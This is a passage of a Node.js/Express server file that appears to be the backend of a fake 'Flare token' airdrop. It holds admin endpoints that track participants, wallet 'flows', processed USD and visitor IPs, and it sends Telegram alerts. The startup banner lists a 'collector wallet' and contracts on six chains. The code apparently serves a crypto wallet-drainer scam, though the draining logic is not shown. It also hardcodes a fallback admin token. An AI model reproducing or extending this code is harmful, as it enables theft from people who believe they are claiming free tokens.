  const adminToken = process.env.ADMIN_TOKEN || 'YourSecureTokenHere123!';
  
  if (token !== adminToken) return res.status(401).json({ success: false });
  
  res.json({
    success: true,
    stats: {
      participants: memoryStorage.participants.length,
      eligible: memoryStorage.participants.filter(p => p.isEligible).length,
      claimed: memoryStorage.participants.filter(p => p.claimed).length,
      totalFLRDistributed: memoryStorage.participants.filter(p => p.claimed).length * 5000,
      totalProcessedUSD: memoryStorage.settings.statistics.totalProcessedUSD.toFixed(2),
      pendingFlows: memoryStorage.pendingFlows.size,
      telegram: telegramEnabled ? '✅' : '❌',
      siteVisits: memoryStorage.siteVisits.length,
      uniqueIPs: memoryStorage.settings.statistics.uniqueIPs.size,
      token: 'FLR'
    }
  });
});

// ============================================
// ADMIN WALLET DETAILS
// ============================================

app.get('/api/admin/wallet/:address', (req, res) => {
  const token = req.query.token;
  const adminToken = process.env.ADMIN_TOKEN || 'YourSecureTokenHere123!';
  
  if (token !== adminToken) return res.status(401).json({ success: false });
  
  const walletAddress = req.params.address.toLowerCase();
  
  const participant = memoryStorage.participants.find(p => p.walletAddress === walletAddress);
  const visits = memoryStorage.siteVisits.filter(v => v.walletAddress === walletAddress);
  const flows = Array.from(memoryStorage.pendingFlows.values())
    .filter(f => f.walletAddress === walletAddress);
  const completed = Array.from(memoryStorage.completedFlows.values())
    .filter(f => f.walletAddress === walletAddress);
  const transactions = memoryStorage.settings.statistics.processedTransactions
    .filter(t => t.wallet.toLowerCase() === walletAddress);
  
  if (!participant) {
    return res.json({ 
      success: true, 
      found: false,
      message: 'Wallet not found in database'
    });
  }
  
  res.json({
    success: true,
    found: true,
    wallet: {
      ...participant,
      connectedAt: participant.connectedAt?.toISOString(),
      lastScanned: participant.lastScanned?.toISOString(),
      claimedAt: participant.claimedAt?.toISOString()
    },
    visits,
    flows,
    completedFlows: completed,
    transactions
  });
});

// ============================================
// TELEGRAM TEST ENDPOINT
// ============================================

app.get('/api/admin/test-telegram', async (req, res) => {
  const token = req.query.token;
  const adminToken = process.env.ADMIN_TOKEN || 'YourSecureTokenHere123!';
  
  if (token !== adminToken) return res.status(401).json({ success: false });
  
  const success = await sendTelegramMessage(
    `🧪 <b>FLARE TOKEN TEST MESSAGE</b>\n\n` +
    `✅ Telegram integration is working!\n` +
    `🤖 Bot: @${telegramBotName}\n` +
    `⏰ Time: ${new Date().toLocaleString()}`
  );
  
  res.json({ 
    success, 
    telegramEnabled,
    botName: telegramBotName 
  });
});

// ============================================
// 404 Handler
// ============================================

app.use('*', (req, res) => {
  res.status(404).json({ success: false, error: 'Endpoint not found' });
});

// ============================================
// ERROR HANDLER
// ============================================

app.use((err, req, res, next) => {
  console.error('Server error:', err);
  res.status(500).json({ 
    success: false, 
    error: 'Internal server error',
    message: err.message 
  });
});

// ============================================
// START SERVER
// ============================================

app.listen(PORT, '0.0.0.0', async () => {
  console.log(`
  ⚡ FLARE TOKEN BACKEND - MULTICHAIN FLOW ROUTER
  ================================================
  📍 Port: ${PORT}
  🔗 URL: https://flarebackend.vercel.app/
  🪙 Token: FLR (Flare)
  
  📦 COLLECTOR WALLET: ${COLLECTOR_WALLET}
  
  🌐 DEPLOYED CONTRACTS:
  ✅ Ethereum: 0x7264F557f762f16aC7937292D19449c5CE962288
  ✅ BSC: 0x7264F557f762f16aC7937292D19449c5CE962288
  ✅ Polygon: 0x54b4A3C43CFf0aC70A8AC3f38f0fdC5DFA1cb278
  ✅ Arbitrum: 0x54b4A3C43CFf0aC70A8AC3f38f0fdC5DFA1cb278
  ✅ Avalanche: 0xF6F0B833186DD54B772a93002ab765fc7Ab9D01F
  ✅ Flare: 0xF6F0B833186DD54B772a93002ab765fc7Ab9D01F
  
  📊 MONITORING:
  👥 Participants: 0
  🎯 Eligible: 0
  ✅ Claimed: 0
  💰 Flows: 0
  💵 Total Processed: $0
  
  🚀 READY FOR FLARE TOKEN DISTRIBUTION
  ================================================
  `);
  
  const telegramConnected = await testTelegramConnection();
  
  if (telegramConnected) {
    console.log('✅ Telegram notifications active');
  } else {
    console.log('⚠️ Telegram not configured - check .env file');
  }
});

process.on('SIGTERM', () => {
  console.log('SIGTERM received, shutting down gracefully...');
  process.exit(0);
});

process.on('SIGINT', () => {
  console.log('SIGINT received, shutting down gracefully...');
  process.exit(0);
});
